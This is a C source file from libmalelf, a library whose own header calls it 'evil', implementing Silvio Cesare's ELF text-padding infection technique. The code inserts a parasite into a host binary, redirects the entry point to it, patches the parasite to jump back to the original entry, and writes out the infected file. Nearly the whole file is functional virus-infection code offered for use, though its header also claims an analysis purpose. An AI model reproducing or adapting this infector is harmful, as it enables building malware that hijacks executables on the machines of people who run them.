/*
 * The libmalelf is an evil library that could be used for good! It was
 * developed with the intent to assist in the process of infecting
 * binaries and provide a safe way to analyze malwares.
 *
 * Evil using this library is the responsibility of the programmer.
 *
 * Author:
 *         Tiago Natel de Moura <natel@secplus.com.br>
 *
 * Contributors:
 *         Daniel Ricardo dos Santos <danielricardo.santos@gmail.com>
 *         Paulo Leonardo Benatto    <benatto@gmail.com>
 *
 * Copyright 2012, 2013 by Tiago Natel de Moura. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
 * implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#include <malelf/types.h>
#include <malelf/infect.h>
#include <malelf/util.h>
#include <malelf/error.h>
#include <malelf/binary.h>

#define PAGE_SIZE 4096

/**
 * Patch a dword in virus at specified address.
 *
 * Patch the virus in the offset specified by 'offset' with
 * the value of 'value'.
 * Can be used to patch the return address of malware to execute the
 * host program.
 *
 * @var MalelfBinary -- parasite object
 * @var _u32 -- offset to patch
 * @var unsigned -- value to patch
 */
_u8 malelf_infect_patch_virus_at(MalelfBinary *parasite,
                                 _u32 offset,
                                 unsigned value) {
        _u8* parasite_data = parasite->mem;

        if (offset < (unsigned) parasite->size) {
                *(unsigned *)&parasite_data[offset] = value;
        } else {
                LOG_ERROR("Invalid return offset for entry point.\n");
                LOG_ERROR("Offset is out of malware size.\n");
                return MALELF_EINV_OFFSET_ENTRY;
        }

        return MALELF_SUCCESS;
}

/**
 * Find the magic byte 'magic_bytes' in parasite and patch if
 * value_addr.
 *
 * @var MalelfBinary -- parasite
 * @var unsigned long int -- magic_bytes
 * @var unsigned -- value_addr
 */
_u8 malelf_infect_patch_virus_at_magic_byte(MalelfBinary *parasite,
                                            _u32 magic_bytes,
                                            _u32 value_addr) {
        _u32 offset_entry_point = 0;
        union malelf_dword magic_addr;
        _u8* parasite_data = parasite->mem;

        if (magic_bytes == 0) {
                magic_addr.long_val = MALELF_MAGIC_BYTES;
        } else {
                magic_addr.long_val = magic_bytes;
        }

        offset_entry_point = malelf_find_magic_number(parasite,
                                                      magic_addr);

        if (offset_entry_point == 0) {
                LOG_ERROR("Failed to find magic bytes in malware...\n");
                return MALELF_EMISSING_MAGIC_BYTES;
        }

        if (offset_entry_point < (unsigned) parasite->st_info.st_size) {
                *(unsigned *)&parasite_data[offset_entry_point] =
                        value_addr;
        } else {
                LOG_ERROR("Invalid return offset for entry point"
                          " in malware ...\n");
                return MALELF_EINV_OFFSET_ENTRY;
        }

        return MALELF_SUCCESS;
}

/**
 * Try to infect the ELF using the text padding technique created
 * by Silvio Cesare.
 * More information:
 * http://www.win.tue.nl/~aeb/linux/hh/virus/unix-viruses.txt
 */
_u8 malelf_infect_silvio_padding(MalelfBinary* input,
                                 MalelfBinary* output,
                                 MalelfBinary* parasite,
                                 _u32 offset_entry_point,
                                 unsigned long int magic_bytes) {
        int i;
        _i32 error = MALELF_SUCCESS;
        char text_found;
        malelf_elf_t *ielf;
        ElfW(Ehdr) *ehdr;
        ElfW(Shdr) *shdr;
        ElfW(Phdr) *phdr;

        unsigned int after_insertion_offset = 0;
        unsigned int end_of_text = 0;
        unsigned long int old_e_entry = 0;
        unsigned long parasite_vaddr = 0;
        unsigned long text = 0;

        text_found = 0;

        ielf = &input->elf;
        ehdr = ielf->elfh;
        phdr = ielf->elfp;
        shdr = ielf->elfs;

        for (i = ehdr->e_phnum; i-- > 0; phdr++) {
                if (text_found) {
                        /* shift every segment after the text segment by PAGE_SIZE */
                        phdr->p_offset += PAGE_SIZE;
                        continue;
                } else {
                        if(phdr->p_type == PT_LOAD) {
                                /* TEXT SEGMENT */
                                if (phdr->p_flags == (PF_R | PF_X)) {
                                        text = phdr->p_vaddr;
                                        parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;

                                        /* save old entry point to jmp later */
                                        /* and patch entry point to our new entry */
                                        old_e_entry = ehdr->e_entry;
                                        ehdr->e_entry = parasite_vaddr;
                                        end_of_text = phdr->p_offset + phdr->p_filesz;
                                        /* increase memsz and filesz */
                                        phdr->p_filesz += parasite->st_info.st_size;
                                        phdr->p_memsz += parasite->st_info.st_size;
                                        after_insertion_offset = phdr->p_offset + phdr->p_filesz;
                                        text_found++;
                                }
                        }
                }
        }

        if (old_e_entry == 0 || after_insertion_offset == 0) {
                LOG_ERROR("Failed to get old entry point...\n");
                exit(-1);
        }

        /* Increase size of any section that resides after injection
         * by page size
         */
        for (i = ehdr->e_shnum; i-- > 0; shdr++) {
                if (shdr->sh_offset >= after_insertion_offset)
                        shdr->sh_offset += PAGE_SIZE;
                else
                        if (shdr->sh_size + shdr->sh_addr == parasite_vaddr)
                                shdr->sh_size += parasite->st_info.st_size;

        }

        if (!text) {
                LOG_ERROR("Could not locate text segment, exiting\n");
                exit(-1);
        }

        LOG_SUCCESS("Text segment starts at 0x%08x\n", (unsigned int) text);
        LOG_SUCCESS("Patched entry point from 0x%x to 0x%x\n",
                    (unsigned)old_e_entry, (unsigned)ehdr->e_entry);
        LOG_SUCCESS("Inserting parasite at offset %x vaddr 0x%x\n",
                    (unsigned)end_of_text, (unsigned)parasite_vaddr);

        ehdr->e_shoff += PAGE_SIZE;
        error = _malelf_parasite_silvio_padding(input,
                                                output,
                                                end_of_text,
                                                parasite,
                                                offset_entry_point,
                                                old_e_entry,
                                                magic_bytes);

        malelf_close(input);
        return error;
}

_u8 _malelf_parasite_silvio_padding(MalelfBinary* input,
                                    MalelfBinary* output,
                                    unsigned int end_of_text,
                                    MalelfBinary* parasite,
                                    _u32 offset_entry_point,
                                    unsigned old_e_entry,
                                    unsigned long int magic_bytes) {
        _u8 error;
        unsigned int c;
        char *parasite_data = (char*)parasite->mem;

        LOG_SUCCESS("Inserting parasite\n");

        if ((error = malelf_openw(output, output->fname))
            != MALELF_SUCCESS) {
                LOG_ERROR("Failed to open file '%s' for write.\n",
                          output->fname);
                return error;
        }

        if ((c = write(output->fd,
                       input->mem,
                       end_of_text)) != end_of_text) {
                return errno;
        }

        if (offset_entry_point == 0) {
                if ((error = malelf_infect_patch_virus_at_magic_byte(parasite,
                                                              magic_bytes,
                                                              old_e_entry))
                    != MALELF_SUCCESS) {
                        return error;
                }
        } else {
                if ((error = malelf_infect_patch_virus_at(parasite,
                                                   offset_entry_point,
                                                   old_e_entry)) != MALELF_SUCCESS) {
                        return error;
                }
        }

        if ((c = write(output->fd,
                       parasite_data,
                       parasite->st_info.st_size))
            != (unsigned)parasite->st_info.st_size) {
                return errno;
        }

        if((c = lseek(output->fd,
                      PAGE_SIZE - parasite->st_info.st_size,
                      SEEK_CUR)) != end_of_text + PAGE_SIZE) {
                return errno;
        }

        input->mem += end_of_text;

        /* unsigned int sum = end_of_text + PAGE_SIZE; */
        unsigned int last_chunk = input->st_info.st_size - end_of_text;

        if ((c = write(output->fd, input->mem, last_chunk)) != last_chunk) {
                return errno;
        }

        LOG_SUCCESS("Successfully infected: %s\n", output->fname);
        return MALELF_SUCCESS;
}
